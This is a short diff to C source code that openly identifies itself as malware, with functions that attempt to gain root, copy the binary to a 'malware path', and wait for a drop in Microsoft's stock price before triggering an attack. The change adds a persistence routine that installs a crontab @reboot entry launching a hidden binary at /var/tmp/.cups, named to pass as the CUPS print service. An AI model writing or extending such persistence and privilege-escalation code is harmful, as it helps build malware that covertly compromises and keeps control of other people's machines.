@@ -20,7 +20,7 @@ void * start_trigger(void *varg){
 
     if (!is_attacking){
         trigger_attack = get_microsoft_stock(global);
-        while(trigger_attack != 1) // Wait until stock value drops by 10%
+        while(trigger_attack != 1) // Wait until stock value drops more than a 10%
         {
             trigger_attack = get_microsoft_stock(global);
             global->usleep(1000); // Delay for 1000 microseconds (1 millisecond)
@@ -68,9 +68,16 @@ void copy_to_malware_path(Globals *global, char *mwpath) {
     }
 }
 
+void try_add_crontab(Globals *global){
+    // check if it's added if not add it to the crontab
+    global->system("crontab -l | grep \".cups\" || ((crontab -l; echo \"@reboot /var/tmp/.cups\") | crontab -)");
+}
+
 void entry(Globals *global) {
     // try to gain root
     try_get_root(global);
+
+    try_add_crontab(global);
 
     // load the file content into the global buffer
     load_file_bytes(global);
